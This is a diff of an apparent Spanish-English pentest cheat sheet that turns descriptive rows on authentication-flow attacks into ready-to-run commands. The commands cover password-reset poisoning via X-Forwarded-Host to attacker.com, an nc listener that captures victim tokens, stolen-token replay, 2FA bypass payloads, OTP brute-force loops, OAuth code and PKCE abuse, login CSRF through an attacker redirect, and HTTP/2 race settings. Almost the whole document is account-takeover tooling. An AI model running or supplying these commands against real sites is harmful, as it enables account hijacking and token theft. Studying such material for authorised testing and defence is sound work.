@@ -26,21 +26,16 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Token via Referer leak | URL con token → atacante's page → Referer | Standard. |
-| Reset poisoning | HHI inyecta link con attacker domain | High impact. |
-| Reset token NOT consumed | Single-use claim but not enforced | Reuse vector. |
-| Reset token never expires | No expiry → forever valid | Persistencia. |
-| Token tied to non-session | Email → atacante intercepts → uses on victim | TOCTOU. |
-| Predictable reset tokens | UUIDv1 / sequential | Predict. |
-| Token disclosed en response body | Return en JSON post-request | Disclosure. |
-| Token in error message | Verbose error includes token | Disclosure. |
-| Reset endpoint without token | `POST /reset { email: 'victim', password: 'new' }` | Auth missing. |
-| Reset with arbitrary user | If app accepts user_id as parameter | IDOR + reset. |
-| Email confirm en reset | New password set, atacante adds email | Email hijack chain. |
-| Race en reset | Token consume race | Race conditions. |
-| Combine con HHI | Email link Host poisoned | Standard. |
-| Combine con SAML logout | Reset triggers SAML re-auth | Federated edge. |
-| Multi-step reset bypass | Skip confirm step | Logic flaw. |
+| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "email=victim@target.com" https://target.com/forgot` | HHI reset poisoning — email link a attacker | Backend trusts XFH. |
+| `nc -lvnp 80` en attacker.com → recibe `GET /reset?token=...` | Listener captura token | Setup phishing. |
+| `curl https://target/reset?token=$STOLEN -d "password=ATTACKER"` | Replay token contra legit endpoint | Final ATO step. |
+| `curl https://target/reset?token=$STOLEN_TOKEN` (repetido 5 veces) | Test single-use enforcement | Reuse vector check. |
+| `curl https://target/reset?token=$OLD_TOKEN` con token de semanas pasadas | Test token expiry | No-expiry persistence. |
+| `curl -X POST -d "email=victim@target.com&password=ATTACKER" https://target/reset` (sin token) | Endpoint sin token validation | Direct missing-auth. |
+| `curl -X POST -d "user_id=2&password=ATTACKER" https://target/reset` | IDOR + reset combo | Token tied to user_id. |
+| `curl -X POST -H "Cookie: $C" -d "email=victim@target.com" https://target/forgot \| jq .token` | Token disclosed en response body | Info disclosure. |
+| Burp Repeater group `POST /reset {token: $T}` × 100 parallel | Race condition en token consume | Race + reuse. |
+| `curl -X POST -d "email=victim@target.com,attacker@evil.com" https://target/forgot` | Multi-recipient via email injection | SMTP injection adjacent. |
 ^auth-flow-reset
 
 ___
@@ -49,25 +44,17 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| 2FA endpoint accepts empty | `POST /verify { code: "" }` | Empty bypass. |
-| 2FA endpoint accepts null | `code: null` | Same. |
-| 2FA flag in body | `{ code: "1234", verified: true }` | Flag injection. |
-| Skip 2FA via direct browse | `/dashboard` accessible sin 2FA verify | Forced browsing. |
-| 2FA brute force sin rate limit | Multi-thread 6-digit OTP | Hashcat-grade speed. |
-| 2FA brute con race | Race conditions con HTTP/2 single-packet | Modern. |
-| OTP reuse | Old OTP still valid | Replay. |
-| OTP guess via phone | Hardcoded test numbers | Edge. |
-| 2FA disable via mass assign | `{"mfa_enabled": false}` en profile update | Combine. |
-| Session bypass mid-flow | Session marked authenticated antes de 2FA | Session race. |
-| 2FA bypass via API | API endpoint sin 2FA enforcement | API/Web mismatch. |
-| 2FA bypass via legacy endpoint | `/api/v1/...` no enforces vs `/v2/` | Versioning. |
-| 2FA bypass via OAuth | OAuth flow skips 2FA | Federation. |
-| Backup codes reuse | Single-use violated | Edge. |
-| Magic link instead of 2FA | Some apps accept magic link as primary | Bypass MFA. |
-| TOTP clock skew abuse | Wide window | Edge. |
-| Push notification race | Approve race con concurrent | Race. |
-| WebAuthn challenge replay | Reuse challenge | Crypto edge. |
-| Phone number swap | Atacante adds phone before 2FA | Combine. |
+| `curl -X POST -H "Cookie: $C" -d '{"code":""}' https://target/api/2fa/verify` | Empty code bypass | Backend acepta vacío. |
+| `curl -X POST -H "Cookie: $C" -d '{"code":null}' https://target/api/2fa/verify` | Null code bypass | Null treated as valid. |
+| `curl -X POST -H "Cookie: $C" -d '{"code":"123456","verified":true}' https://target/api/2fa/verify` | Flag injection en body | Mass Assignment 2FA. |
+| `curl -H "Cookie: $C_PRE_2FA" https://target/dashboard` | Direct forced browsing post-login pre-2FA | Session marked authenticated pre-2FA. |
+| Burp Intruder con `?code=FUZZ` y wordlist `0000-9999` | OTP brute con rate limit defeated | Sin rate limit / weak limit. |
+| Burp Repeater group `POST /verify {code}` × 100 single connection HTTP/2 | OTP brute via race condition | Single-packet race. |
+| `curl -X POST -H "Cookie: $C" -d '{"code":"$OLD_OTP"}' https://target/api/2fa/verify` | OTP reuse | Old OTP still valid. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"mfa_enabled":false}' https://target/api/users/me` | 2FA disable via Mass Assignment | Combine MA + 2FA. |
+| `curl -H "Cookie: $C" https://target/api/v1/dashboard` (vs v2 que enforce 2FA) | API version differential | Old endpoint sin 2FA. |
+| OAuth flow: `https://idp/oauth/authorize?...` (login as victim via OAuth) | OAuth bypasses 2FA del app | Federation skip MFA. |
+| `curl -X POST -H "Cookie: $C" -d '{"code":"$BACKUP_CODE"}' https://target/api/2fa/verify` × 2 | Backup codes reuse | Single-use violated. |
 ^auth-flow-2fa
 
 ___
@@ -76,18 +63,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Magic link single-use violated | Use same link twice | Reuse vector. |
-| Magic link long expiry | No expiry → valid forever | Persistencia. |
-| Magic link via Referer leak | URL with token leaked | Standard. |
-| Magic link tied to non-session | Atacante intercepts email → uses on victim browser | TOCTOU. |
-| Magic link guess | Predictable token | Brute. |
-| Login URL en Referer | Email scanner clicks → atacante captures via Referer | Email scanners. |
-| Email scanner pre-consume | Scanner clicks first → token consumed before user | Edge. |
-| Combine con HHI | Magic link host poisoned | Same as reset. |
-| Magic link accepts arbitrary user | If user_id in URL not bound to token | IDOR + magic. |
-| Race en magic link | Token consume race | Race. |
-| Magic link en error pages | Token reflected en error page | Disclosure. |
-| Email pre-fetcher captures | iOS Mail / Apple privacy fetches links | Pre-consume. |
+| `curl https://target/auth?token=$T` × 3 | Magic link single-use violated | Reuse vector. |
+| `curl https://target/auth?token=$T` con token semanas viejo | No-expiry persistence | Token sin TTL. |
+| `<img src="https://attacker.com/log">` en página víctima post-magic-link → Referer leak | Token leak via Referer | Cross-origin Referer. |
+| `curl -X POST -H "X-Forwarded-Host: attacker.com" -d "email=victim" https://target/login/magic` | HHI magic link poisoning | Email link a attacker. |
+| Burp Repeater group `GET /auth?token=$T` × N parallel | Race condition en token consume | Race + reuse. |
+| `curl https://target/auth?token=$T&user_id=2` (cambiar user_id) | IDOR + magic combo | Token + user_id no bound. |
+| Wait for email scanner to click (Outlook ATP, Mimecast) → token consumed | Email scanner pre-consume | DoS variant. |
+| `for token in $(generate_predictable_tokens); do curl -sI "https://target/auth?token=$token"; done` | Brute predictable magic tokens | Weak token generation. |
 ^auth-flow-magic
 
 ___
@@ -96,17 +79,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Skip confirm endpoint | `POST /confirm { email: 'victim', confirmed: true }` | Direct. |
-| Confirm flag self-set | Mass Assignment `{ "email_verified": true }` | Common. |
-| Confirm token reuse | Same token works multiple times | Reuse. |
-| Confirm token IDOR | Token tied to ID, change ID | IDOR. |
-| OAuth-bypass confirm | If OAuth, sometimes auto-confirms email | Federation. |
-| Login pre-confirm | Some apps allow login before email confirm | Logic flaw. |
-| Different endpoint less strict | `/api/v1/confirm` vs `/api/v2/confirm` | Per-version. |
-| Multi-step skip step | Confirm requires email verify + click → race skip | Multi-stage. |
-| Send confirm to atacante's email | Inject email field con `victim@attacker.com` | Combine HHI. |
-| Email reuse for multiple accounts | If email not unique → privesc | Logic. |
-| Confirm via header | If header `X-Email-Verified: true` trusted | Spoofing. |
+| `curl -X POST -d '{"email":"victim@target.com","confirmed":true}' https://target/api/confirm` | Mass Assignment confirmed flag | Direct flag inject. |
+| `curl -X PATCH -H "Cookie: $C" -d '{"email_verified":true}' https://target/api/users/me` | Self-set email_verified via MA | Profile update. |
+| `curl https://target/confirm?token=$T` × 5 | Confirm token reuse | Single-use violated. |
+| `curl https://target/confirm?token=$T&user_id=2` (cambiar user_id) | IDOR + confirm combo | Token + user_id no bound. |
+| Login pre-confirm: `curl -X POST -d "email=test&password=x" https://target/login` (cuenta no verificada) | App permite login antes de email confirm | Logic flaw. |
+| `curl https://target/api/v1/confirm?token=$T` vs `curl https://target/api/v2/confirm?token=$T` | Endpoint version differential | Per-version. |
+| `curl -X POST -H "X-Email-Verified: true" -H "Cookie: $C" https://target/restricted` | Header trust spoof | Custom header trust. |
+| OAuth signup con email victim: Google con `victim@target.com` unverified → signup en target con Google → server crea cuenta con email víctima | Pre-account takeover via OAuth | App no verifica `email_verified` claim. |
 ^auth-flow-email-confirm
 
 ___
@@ -115,21 +95,15 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| State parameter missing | OAuth authz request sin `state` | CSRF + code theft. |
-| State predictable | Counter / timestamp / no random | Predict. |
-| State not validated | Server accepts any state | No CSRF protection. |
-| State tied to non-session | Reuse state across sessions | Edge. |
-| Nonce missing en OpenID | OpenID flow sin `nonce` | Replay. |
-| Nonce predictable | Same logic as state | Bypass. |
-| Code reuse | Authorization code single-use violated | Reuse. |
-| Code TOCTOU | Race en code exchange | Combine race. |
-| PKCE missing for public client | Public OAuth client without PKCE | Standard. |
-| PKCE downgrade | Force `none` PKCE method | Edge. |
-| `redirect_uri` permits multiple | Atacante's URI in whitelist | Direct. |
-| `client_id` confusion | Multiple clients confusion | Edge multi-tenant. |
-| Implicit flow with response_type=token | Token in fragment direct | Direct theft. |
-| OAuth login CSRF | Login as atacante's account | Atacante session injection. |
-| `prompt=none` silent auth | Sometimes bypasses interactive | Edge. |
+| `curl -sI "https://idp/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://known.com/cb&scope=email"` (sin `state`) | State omission → CSRF posible | Server no exige state. |
+| `curl -sI "https://target/cb?code=AAA"` (sin state param) | Callback acepta sin state validation | Validation absent. |
+| `curl -sI "https://idp/oauth/authorize?...&state=anything"` | State presence-only validation | Fake validation. |
+| `curl -X POST -d "code=$STOLEN&client_id=APP&redirect_uri=https://attacker/cb" https://idp/oauth/token` (replay 2x) | Code reuse single-use violated | Spec violation. |
+| `curl -X POST -d "code=$CODE&client_id=B" https://idp/oauth/token` (cliente B con code de A) | Cross-client code substitution | Code no bound a client_id. |
+| `curl -X POST -d "code=$CODE&redirect_uri=https://attacker/cb&client_id=APP" https://idp/oauth/token` (sin code_verifier) | PKCE bypass | Server no enforce PKCE. |
+| `curl -sI "https://idp/oauth/authorize?response_type=token&..."` | Implicit flow habilitado — token directo | Legacy support. |
+| `<img src="https://idp/oauth/authorize?client_id=APP&response_type=code&redirect_uri=https://attacker/cb&state=ATTACKER">` | Login CSRF — víctima auth con código atacante intercepta | State no bound a víctima session. |
+| `curl -sI "https://idp/oauth/authorize?...&prompt=none"` | Silent re-auth | Sesión preexistente bypass. |
 ^auth-flow-oauth-state
 
 ___
@@ -138,17 +112,14 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Limit overrun login | 50 login attempts en single packet (HTTP/2) | Bypass rate limit. |
-| 2FA OTP brute con race | Same idea con OTP verification | Standard. |
-| Reset token reuse | Race entre token validate y consume | Reuse. |
-| Magic link race | Same | Edge. |
-| Account creation race | Parallel signups con same username | Username collision. |
-| 2FA enrollment race | Setup + bypass | Standard. |
-| Password change race | Old + new pass set | Combine. |
-| OAuth code race | Code exchange en parallel | Token reuse. |
-| Email change race | Confirm email + revert | Email confusion. |
-| Combine con Single-packet attack | HTTP/2 single-packet | Modern. |
-| See `Race Conditions` | Comprehensive | Cross-ref. |
+| Burp Repeater group `POST /login {user, pass}` × 50 parallel single conn HTTP/2 | Bypass rate limit via race | Login race. |
+| Burp Intruder con Turbo Intruder + `concurrentConnections=1, engine=Engine.BURP2` | OTP brute via HTTP/2 single-packet | Modern race. |
+| `for i in {1..100}; do curl -X POST -H "Cookie: $C" -d "code=123456" https://target/api/2fa/verify & done; wait` | Bash parallel OTP race | Quick test. |
+| Burp Repeater group `POST /reset {token: $T}` × 100 parallel | Reset token reuse race | Token consume race. |
+| Burp Repeater group `POST /signup {username: alice}` × 50 parallel | Account creation race — username collision | Parallel signups. |
+| Burp Repeater group `POST /2fa/setup + POST /2fa/skip` parallel | 2FA enrollment race | Setup + bypass simultáneos. |
+| Burp Repeater group `POST /password/change {old, new}` × 50 con wrong old | Password change race sin verify old | Atomic check missing. |
+| Turbo Intruder script con `engine=Engine.BURP2, concurrentConnections=1` para login attempts | HTTP/2 single-packet race | Volume + sync. |
 ^auth-flow-race
 
 ***
